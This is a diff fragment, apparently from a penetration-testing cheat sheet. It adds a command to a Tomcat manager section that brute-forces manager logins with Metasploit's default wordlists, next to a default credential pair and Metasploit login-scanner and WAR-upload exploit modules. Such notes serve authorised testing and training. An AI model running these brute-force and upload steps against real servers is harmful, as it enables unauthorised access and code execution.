@@ -1022,6 +1022,7 @@ http://<IP address>:<port>/manager/html
 tomcat:s3cret
 use auxiliary/scanner/http/tomcat_mgr_login
 use exploit/multi/http/tomcat_mgr_upload
+$ python3 mgr_brute.py -U <URL> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
 - WordPress
